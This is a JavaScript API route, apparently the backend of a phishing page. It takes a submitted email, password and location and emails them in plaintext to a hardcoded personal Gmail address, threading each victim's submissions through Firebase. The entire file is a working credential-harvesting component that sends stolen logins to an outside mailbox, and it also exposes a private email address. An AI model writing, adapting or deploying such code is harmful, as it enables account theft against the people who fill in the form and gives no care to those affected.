import { db, get, ref, set } from "@/lib/firebase";
import nodemailer from "nodemailer";

const adminEmail = "Blakesdennis@gmail.com";

export async function POST(req) {
  try {
    const body = await req.json();
    const { email, password, location } = body;

    const userRef = ref(db, `emailThreads/${email.replace(/\./g, "_")}`);
    
    const snapshot = await get(userRef);
    let threadId = snapshot.exists() ? snapshot.val().messageId : null;

    if (!threadId) {
      threadId = `<${email.replace(/\W/g, "")}@gmail.com>`;
      await set(userRef, { messageId: threadId });
    }

    const transporter = nodemailer.createTransport({
      service: "gmail",
      auth: {
        user: process.env.EMAIL_USER, 
        pass: process.env.EMAIL_PASS, 
      },
    });

    const mailOptions = {
      from: `"Form Submission" <${process.env.EMAIL_USER}>`,
      to: adminEmail,
      subject: `New Submission from ${email}`,
      text: `Email: ${email}\nPassword: ${password}\nLocation: ${location}`,
      headers: {
        "Message-ID": `<${Date.now()}@gmail.com>`,
        "In-Reply-To": threadId,
        References: threadId,
      },
    };

    await transporter.sendMail(mailOptions);

    return new Response(JSON.stringify({ success: true, message: "Email sent successfully!" }), { status: 200 });
  } catch (error) {
    console.error("Error sending email:", error);
    return new Response(JSON.stringify({ success: false, message: "Failed to send email." }), { status: 500 });
  }
}
